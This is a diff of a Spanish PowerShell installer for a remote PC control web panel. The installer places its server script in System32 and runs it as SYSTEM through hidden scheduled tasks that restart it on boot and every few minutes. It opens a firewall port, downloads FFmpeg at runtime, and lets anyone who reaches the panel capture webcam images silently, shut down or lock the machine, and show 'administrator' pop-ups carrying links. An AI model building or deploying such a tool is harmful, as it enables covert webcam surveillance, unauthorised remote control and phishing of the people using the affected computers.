@@ -80,11 +80,9 @@ function Initialize-FFmpeg {
         $zipPath = "$tempDir\$zipPackage"
         
         try {
-            # Descargar el paquete
             Invoke-WebRequest -Uri "$baseUrl/$zipPackage" -OutFile $zipPath -ErrorAction Stop
             Write-Log "Paquete descargado: $zipPath"
             
-            # Descomprimir
             Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
             Remove-Item -Path $zipPath -Force
             Write-Log "FFmpeg descomprimido correctamente"
@@ -106,17 +104,14 @@ function Get-WebCamCapture {
     
     Write-Log "Iniciando captura de webcam..."
     
-    # Verificar FFmpeg
     if (-not (Initialize-FFmpeg)) {
         Write-Log "ERROR: No se pudo inicializar FFmpeg"
         return $null
     }
     
     try {
-        # Detectar cámaras
         Write-Log "Detectando cámaras disponibles..."
         $devicesOutput = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String
-        Write-Log "Salida de detección de dispositivos: $devicesOutput"
         
         $cameraMatches = [regex]::Matches($devicesOutput, '\[dshow.*?\] "(.*?)" \(video\)')
         
@@ -126,9 +121,8 @@ function Get-WebCamCapture {
         }
         
         $cameraName = $cameraMatches[0].Groups[1].Value
-        Write-Log "Cámara detectada: $cameraName"
+        Write-Log "Camara detectada: $cameraName"
         
-        # Capturar imagen
         Write-Log "Capturando imagen..."
         $tempImage = "$tempDir\webcam_capture_$timestamp.jpg"
         $ffmpegCmd = "`"$ffmpegPath`" -y -f dshow -i video=`"$cameraName`" -frames:v 1 -q:v 2 `"$tempImage`" 2>&1"
@@ -139,21 +133,17 @@ function Get-WebCamCapture {
             return $null
         }
         
-        # Verificar que se creó la imagen
         if (-not (Test-Path $tempImage)) {
-            Write-Log "ERROR: No se generó el archivo de imagen"
+            Write-Log "ERROR: No se genero el archivo de imagen"
             return $null
         }
         
-        # Copiar a la ubicación permanente
         Copy-Item $tempImage $outputFile -Force
         Write-Log "Captura guardada: $outputFile"
         
-        # Convertir a base64 para enviar
         $imageBytes = [System.IO.File]::ReadAllBytes($tempImage)
         $base64Image = [Convert]::ToBase64String($imageBytes)
         
-        # Limpiar archivo temporal
         Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
         
         Write-Log "Captura completada exitosamente"
@@ -174,13 +164,11 @@ function Send-PopupMessage {
     
     Write-Log "Enviando mensaje popup: $Title"
     
-    # Construir mensaje con enlace si existe
     $displayMessage = $Message
     if ($Link) {
         $displayMessage += "`n`nEnlace: $Link"
     }
     
-    # Crear un script de PowerShell para mostrar la ventana emergente
     $popupScript = @"
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -189,24 +177,24 @@ Add-Type -AssemblyName System.Drawing
 `$form.Text = "$Title"
 `$form.Size = New-Object System.Drawing.Size(550, 350)
 `$form.StartPosition = "CenterScreen"
-`$form.Topmost = $true
+`$form.Topmost = `$true
 `$form.FormBorderStyle = "FixedDialog"
-`$form.MaximizeBox = $false
-`$form.MinimizeBox = $false
-`$form.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
+`$form.MaximizeBox = `$false
+`$form.MinimizeBox = `$false
+`$form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
 
 `$label = New-Object System.Windows.Forms.Label
 `$label.Text = "$displayMessage"
 `$label.Location = New-Object System.Drawing.Point(20, 30)
 `$label.Size = New-Object System.Drawing.Size(490, 150)
 `$label.Font = New-Object System.Drawing.Font("Segoe UI", 10)
-`$label.ForeColor = [System.Drawing.Color]::White
+`$label.ForeColor = [System.Drawing.Color]::Black
 `$label.TextAlign = "MiddleCenter"
 
 `$buttonPanel = New-Object System.Windows.Forms.Panel
 `$buttonPanel.Location = New-Object System.Drawing.Point(0, 200)
 `$buttonPanel.Size = New-Object System.Drawing.Size(534, 80)
-`$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
+`$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
 
 `$buttonAceptar = New-Object System.Windows.Forms.Button
 `$buttonAceptar.Text = "Aceptar"
@@ -243,10 +231,8 @@ if ("$Link") {
     $popupFile = "$env:TEMP\popup_$(Get-Random).ps1"
     $popupScript | Out-File $popupFile -Encoding UTF8 -Force
     
-    # Ejecutar el script en la sesión del usuario actual
     Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Normal -File `"$popupFile`"" -WindowStyle Normal
     
-    # Eliminar el script después de unos segundos
     Start-Sleep -Seconds 10
     Remove-Item $popupFile -ErrorAction SilentlyContinue
     
@@ -289,37 +275,41 @@ function Start-WebServer {
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CONTROL PC REMOTO</title>
+<title>Control PC Remoto</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; min-height: 100vh; }
-.container { max-width: 1200px; margin: 0 auto; }
-.header { text-align: center; margin-bottom: 30px; }
-.header h1 { color: #00ff9d; font-size: 2.5em; margin-bottom: 10px; }
-.status-card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); border-radius: 15px; padding: 20px; margin-bottom: 30px; border: 1px solid rgba(0, 255, 157, 0.3); }
+body { background: #f5f5f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; }
+.container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 20px; }
+.header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #e0e0e0; padding-bottom: 20px; }
+.header h1 { color: #333; font-size: 24px; }
+.status-card { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin-bottom: 30px; }
 .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; text-align: center; }
-.info-item .label { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
-.info-item .value { font-size: 24px; font-weight: bold; color: #00ff9d; margin-top: 5px; }
+.info-item .label { font-size: 12px; color: #6c757d; text-transform: uppercase; }
+.info-item .value { font-size: 20px; font-weight: bold; color: #007bff; margin-top: 5px; }
 .buttons-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }
-.btn { background: rgba(0, 0, 0, 0.6); border: 1px solid #00ff9d; color: #00ff9d; padding: 12px 20px; text-align: center; cursor: pointer; border-radius: 8px; transition: all 0.3s; font-size: 14px; font-weight: bold; }
-.btn:hover { background: #00ff9d; color: #000; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 157, 0.3); }
-.message-card, .capture-card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); border-radius: 15px; padding: 20px; margin-bottom: 30px; border: 1px solid rgba(0, 255, 157, 0.3); }
-.message-card h3, .capture-card h3 { color: #00ff9d; margin-bottom: 15px; }
-input, textarea { width: 100%; background: rgba(0, 0, 0, 0.8); border: 1px solid #00ff9d; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-family: monospace; }
+.btn { background: #007bff; border: none; color: white; padding: 10px 20px; text-align: center; cursor: pointer; border-radius: 5px; transition: background 0.3s; font-size: 14px; font-weight: 500; }
+.btn:hover { background: #0056b3; }
+.btn-danger { background: #dc3545; }
+.btn-danger:hover { background: #c82333; }
+.btn-warning { background: #ffc107; color: #212529; }
+.btn-warning:hover { background: #e0a800; }
+.btn-success { background: #28a745; }
+.btn-success:hover { background: #218838; }
+.message-card, .capture-card { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin-bottom: 30px; }
+.message-card h3, .capture-card h3 { color: #333; margin-bottom: 15px; font-size: 18px; }
+input, textarea { width: 100%; border: 1px solid #ced4da; border-radius: 4px; padding: 8px 12px; margin-bottom: 10px; font-family: inherit; font-size: 14px; }
 textarea { resize: vertical; min-height: 80px; }
 .capture-preview { text-align: center; margin-top: 15px; }
-.capture-img { max-width: 100%; max-height: 400px; border-radius: 10px; border: 2px solid #00ff9d; }
-.console { background: #000; border: 1px solid #00ff9d; border-radius: 10px; padding: 15px; height: 200px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; color: #0f0; }
-.footer { text-align: center; margin-top: 30px; color: #888; font-size: 12px; }
-@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-.loading { animation: pulse 1s infinite; }
+.capture-img { max-width: 100%; max-height: 400px; border-radius: 5px; border: 1px solid #dee2e6; }
+.console { background: #1e1e1e; border: 1px solid #333; border-radius: 5px; padding: 15px; height: 200px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 12px; color: #d4d4d4; }
+.footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e0e0e0; color: #6c757d; font-size: 12px; }
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<h1>🎮 CONTROL PC REMOTO</h1>
-<p>Panel de control para tus dispositivos</p>
+<h1>Control PC Remoto</h1>
+<p>Panel de control remoto</p>
 </div>
 
 <div class="status-card">
@@ -331,51 +321,50 @@ textarea { resize: vertical; min-height: 80px; }
 </div>
 
 <div class="buttons-grid">
-<button class="btn" onclick="sendCommand('apagar')">⏻ APAGAR</button>
-<button class="btn" onclick="sendCommand('reiniciar')">↻ REINICIAR</button>
-<button class="btn" onclick="sendCommand('bloquear')">🔒 BLOQUEAR</button>
-<button class="btn" onclick="sendCommand('estado')">✓ ESTADO</button>
-<button class="btn" onclick="sendCommand('cancelar')">✖ CANCELAR</button>
-<button class="btn" onclick="captureWebcam()">📸 CAPTURAR WEBCAM</button>
+<button class="btn btn-danger" onclick="sendCommand('apagar')">APAGAR</button>
+<button class="btn btn-warning" onclick="sendCommand('reiniciar')">REINICIAR</button>
+<button class="btn" onclick="sendCommand('bloquear')">BLOQUEAR</button>
+<button class="btn btn-success" onclick="sendCommand('estado')">ESTADO</button>
+<button class="btn" onclick="sendCommand('cancelar')">CANCELAR</button>
+<button class="btn" onclick="captureWebcam()">CAPTURAR WEBCAM</button>
 </div>
 
 <div class="message-card">
-<h3>💬 ENVIAR MENSAJE INTERACTIVO</h3>
-<input type="text" id="msgTitle" placeholder="Título del mensaje" value="📢 Mensaje del Administrador">
-<textarea id="msgText" placeholder="Escribe tu mensaje aquí..."></textarea>
+<h3>Enviar Mensaje</h3>
+<input type="text" id="msgTitle" placeholder="Titulo del mensaje" value="Mensaje del Administrador">
+<textarea id="msgText" placeholder="Escribe tu mensaje aqui..."></textarea>
 <input type="text" id="msgLink" placeholder="Enlace para abrir (opcional)">
-<button class="btn" onclick="sendMessage()" style="width: 100%;">📨 ENVIAR MENSAJE</button>
+<button class="btn" onclick="sendMessage()" style="width: 100%;">ENVIAR MENSAJE</button>
 </div>
 
 <div class="capture-card" id="captureCard" style="display: none;">
-<h3>📷 ÚLTIMA CAPTURA</h3>
+<h3>Ultima Captura</h3>
 <div class="capture-preview">
 <img id="captureImage" class="capture-img">
 </div>
 </div>
 
 <div class="console" id="console">
-<span style="color: #00ff9d;">&gt; SISTEMA LISTO</span><br>
-<span style="color: #888;">&gt; Esperando comandos...</span>
+> SISTEMA LISTO<br>
+> Esperando comandos...
 </div>
 
 <div class="footer">
-Puerto: $Port | PID: $pid | Sistema listo para recibir comandos
+Puerto: $Port | PID: $pid
 </div>
 </div>
 
 <script>
-function addConsoleMessage(msg, type = 'info') {
+function addConsoleMessage(msg, type) {
     const console = document.getElementById('console');
-    const colors = { info: '#00ff9d', error: '#ff4444', success: '#00ff9d' };
-    const color = colors[type] || colors.info;
     const time = new Date().toLocaleTimeString();
-    console.innerHTML += `<br><span style="color: ${color};">&gt; [${time}] ${msg}</span>`;
+    const prefix = type === 'error' ? '[ERROR]' : type === 'success' ? '[OK]' : '[INFO]';
+    console.innerHTML += `<br>> [${time}] ${prefix} ${msg}`;
     console.scrollTop = console.scrollHeight;
 }
 
 async function sendCommand(command) {
-    addConsoleMessage(`Ejecutando comando: ${command}...`, 'info');
+    addConsoleMessage(`Ejecutando: ${command}`, 'info');
     try {
         const response = await fetch('/cmd', {
             method: 'POST',
@@ -404,9 +393,9 @@ async function captureWebcam() {
             const captureImage = document.getElementById('captureImage');
             captureImage.src = `data:image/jpeg;base64,${data.imagen}`;
             captureCard.style.display = 'block';
-            addConsoleMessage('Captura realizada exitosamente!', 'success');
+            addConsoleMessage('Captura realizada exitosamente', 'success');
         } else {
-            addConsoleMessage('Error en la captura: No se recibió imagen', 'error');
+            addConsoleMessage('Error en la captura', 'error');
         }
     } catch (error) {
         addConsoleMessage(`Error: ${error.message}`, 'error');
@@ -419,7 +408,7 @@ async function sendMessage() {
     const link = document.getElementById('msgLink').value;
     
     if (!message) {
-        addConsoleMessage('Por favor escribe un mensaje', 'error');
+        addConsoleMessage('Escribe un mensaje primero', 'error');
         return;
     }
     
@@ -485,36 +474,36 @@ setInterval(updateInfo, 1000);
                 switch ($data.accion) {
                     'apagar' { 
                         shutdown /s /f /t 0
-                        $mensaje = "✅ APAGANDO EQUIPO..."
+                        $mensaje = "APAGANDO EQUIPO..."
                     }
                     'reiniciar' { 
                         shutdown /r /f /t 0
-                        $mensaje = "✅ REINICIANDO EQUIPO..."
+                        $mensaje = "REINICIANDO EQUIPO..."
                     }
                     'bloquear' { 
                         rundll32.exe user32.dll,LockWorkStation
-                        $mensaje = "✅ BLOQUEANDO SESION..."
+                        $mensaje = "BLOQUEANDO SESION..."
                     }
                     'estado' { 
-                        $mensaje = "✅ SISTEMA OK - $(Get-Date)"
+                        $mensaje = "SISTEMA OK - $(Get-Date)"
                     }
                     'cancelar' { 
                         shutdown /a
-                        $mensaje = "✅ APAGADO CANCELADO"
+                        $mensaje = "APAGADO CANCELADO"
                     }
                     'webcam' {
                         $captura = Get-WebCamCapture
                         if ($captura -and $captura.Base64) {
-                            $mensaje = "✅ CAPTURA REALIZADA: $($captura.Timestamp)"
+                            $mensaje = "CAPTURA REALIZADA: $($captura.Timestamp)"
                             $imagen = $captura.Base64
                             Write-Log "Webcam capture successful: $($captura.Path)"
                         } else {
-                            $mensaje = "❌ ERROR AL CAPTURAR WEBCAM - Verifica que haya una cámara conectada"
+                            $mensaje = "ERROR AL CAPTURAR WEBCAM - Verifique que haya una camara conectada"
                             Write-Log "Webcam capture failed"
                         }
                     }
                     default { 
-                        $mensaje = "❌ COMANDO NO RECONOCIDO"
+                        $mensaje = "COMANDO NO RECONOCIDO"
                     }
                 }
                 
@@ -534,7 +523,7 @@ setInterval(updateInfo, 1000);
                 
                 Send-PopupMessage -Message $data.mensaje -Title $data.titulo -Link $data.enlace
                 
-                $result = @{ mensaje = "✅ MENSAJE ENVIADO: $($data.titulo)" }
+                $result = @{ mensaje = "MENSAJE ENVIADO: $($data.titulo)" }
                 $json = $result | ConvertTo-Json
                 $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                 $response.ContentType = 'application/json; charset=utf-8'
@@ -569,13 +558,14 @@ $webServerScript | Out-File "C:\Windows\System32\WebServer.ps1" -Encoding UTF8 -
 
 Write-Host "  OK - Script creado: C:\Windows\System32\WebServer.ps1" -ForegroundColor Green
 
-# Resto del script (configuración firewall, tareas, etc.)
+# Configuración firewall
 Write-Host ""
 Write-Host "2. Configurando firewall..." -ForegroundColor Yellow
 netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
 netsh advfirewall firewall add rule name="PCWeb_SYSTEM" dir=in action=allow protocol=TCP localport=$Puerto 2>$null
 Write-Host "  OK - Regla de firewall agregada" -ForegroundColor Green
 
+# Reservar URLs
 Write-Host ""
 Write-Host "3. Reservando URL en el sistema..." -ForegroundColor Yellow
 netsh http delete urlacl url="http://*:$Puerto/" 2>$null
@@ -587,47 +577,54 @@ netsh http add urlacl url="http://localhost:$Puerto/" user=BUILTIN\Users 2>$null
 netsh http add urlacl url="http://${computerName}:$Puerto/" user=BUILTIN\Users 2>$null
 Write-Host "  OK - URLs reservadas" -ForegroundColor Green
 
+# Crear tareas programadas
 Write-Host ""
-Write-Host "4. Creando tareas programadas como SYSTEM (ADMIN)..." -ForegroundColor Yellow
+Write-Host "4. Creando tareas programadas como SYSTEM..." -ForegroundColor Yellow
 
 schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
 schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null
 
 $taskCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"
 
+# Tarea al iniciar Windows (con retardo para asegurar que el sistema esté listo)
 schtasks /create /tn "PCWeb_SYSTEM" `
     /tr "$taskCommand" `
     /sc onstart `
     /ru SYSTEM `
     /rl HIGHEST `
+    /delay 0000:30 `
     /f 2>$null
 
+# Tarea de respaldo cada 5 minutos (por si acaso el servidor se cae)
 schtasks /create /tn "PCWeb_SYSTEM_Minuto" `
     /tr "$taskCommand" `
     /sc minute `
-    /mo 1 `
+    /mo 5 `
     /ru SYSTEM `
     /rl HIGHEST `
     /f 2>$null
 
 Write-Host "  OK - Tareas creadas como SYSTEM:" -ForegroundColor Green
-Write-Host "    - PCWeb_SYSTEM (al iniciar Windows)" -ForegroundColor White
-Write-Host "    - PCWeb_SYSTEM_Minuto (cada 1 minuto)" -ForegroundColor White
+Write-Host "    - PCWeb_SYSTEM (al iniciar Windows, con retardo de 30 segundos)" -ForegroundColor White
+Write-Host "    - PCWeb_SYSTEM_Minuto (cada 5 minutos, para garantizar que siempre este activo)" -ForegroundColor White
 
+# Matar procesos anteriores
 Write-Host ""
 Write-Host "5. Matando procesos anteriores..." -ForegroundColor Yellow
 Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue 2>$null
 Start-Sleep -Seconds 2
 
+# Iniciar servidor
 Write-Host ""
-Write-Host "6. Iniciando servidor como ADMIN (SYSTEM)..." -ForegroundColor Yellow
+Write-Host "6. Iniciando servidor como SYSTEM..." -ForegroundColor Yellow
 
 $arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"
 Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden -Verb RunAs
 
-Write-Host "  OK - Servidor iniciado como ADMIN" -ForegroundColor Green
+Write-Host "  OK - Servidor iniciado" -ForegroundColor Green
 Start-Sleep -Seconds 5
 
+# Probar conexión
 Write-Host ""
 Write-Host "7. Probando conexion..." -ForegroundColor Yellow
 
@@ -649,10 +646,11 @@ for ($i = 1; $i -le 10; $i++) {
 }
 
 if (-not $conexionExitosa) {
-    Write-Host "  ADVERTENCIA: No se pudo conectar" -ForegroundColor Yellow
+    Write-Host "  ADVERTENCIA: No se pudo conectar, pero el servidor deberia estar funcionando" -ForegroundColor Yellow
     Write-Host "  Revisa el log: C:\Windows\System32\WebServer.log" -ForegroundColor White
 }
 
+# Obtener IP
 try {
     $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*"}).IPAddress | Select-Object -First 1
     if (-not $ip) {
@@ -667,29 +665,21 @@ Write-Host "==========================================" -ForegroundColor Cyan
 Write-Host "   INSTALACION COMPLETADA" -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "🎯 NUEVAS FUNCIONALIDADES INTEGRADAS:" -ForegroundColor Yellow
-Write-Host "  📸 Captura de webcam con FFmpeg (tu método original)" -ForegroundColor Green
-Write-Host "  💬 Mensajes interactivos con ventanas emergentes" -ForegroundColor Green
-Write-Host "  🔗 Enlaces clickeables en los mensajes" -ForegroundColor Green
-Write-Host ""
-Write-Host "🌐 URL DE ACCESO:" -ForegroundColor Yellow
+Write-Host "URL DE ACCESO:" -ForegroundColor Yellow
 Write-Host "  Local:    http://localhost:$Puerto" -ForegroundColor White
 Write-Host "  Red:      http://$($ip):$Puerto" -ForegroundColor White
 Write-Host "  Nombre:   http://${computerName}:$Puerto" -ForegroundColor White
 Write-Host ""
-Write-Host "📁 DIRECTORIOS:" -ForegroundColor Yellow
+Write-Host "ARCHIVOS:" -ForegroundColor Yellow
 Write-Host "  Script:   C:\Windows\System32\WebServer.ps1" -ForegroundColor White
 Write-Host "  Capturas: C:\Windows\System32\WebCamCaptures\" -ForegroundColor White
-Write-Host "  Temp:     %TEMP%\webcam_temp\" -ForegroundColor White
 Write-Host "  Log:      C:\Windows\System32\WebServer.log" -ForegroundColor White
 Write-Host ""
-Write-Host "🎮 CÓMO USAR:" -ForegroundColor Yellow
-Write-Host "  1. Capturar webcam: Haz clic en 'CAPTURAR WEBCAM'" -ForegroundColor White
-Write-Host "  2. Enviar mensaje: Escribe título, mensaje y opcionalmente un enlace" -ForegroundColor White
-Write-Host "  3. Los mensajes aparecerán como ventanas emergentes con botón para abrir enlaces" -ForegroundColor White
-Write-Host "  4. Las capturas se guardan localmente y se muestran en la interfaz web" -ForegroundColor White
+Write-Host "TAREAS PROGRAMADAS (GARANTIZAN QUE EL SERVIDOR SIEMPRE ESTE ACTIVO):" -ForegroundColor Yellow
+Write-Host "  - PCWeb_SYSTEM: Se ejecuta al iniciar Windows (retardo 30 segundos)" -ForegroundColor Green
+Write-Host "  - PCWeb_SYSTEM_Minuto: Se ejecuta cada 5 minutos (respaldo)" -ForegroundColor Green
 Write-Host ""
-Write-Host "🗑️ DESINSTALAR:" -ForegroundColor Yellow
+Write-Host "DESINSTALAR:" -ForegroundColor Yellow
 Write-Host "  powershell -File `"$PSCommandPath`" -Desinstalar" -ForegroundColor White
 Write-Host ""
 Write-Host "==========================================" -ForegroundColor Cyan
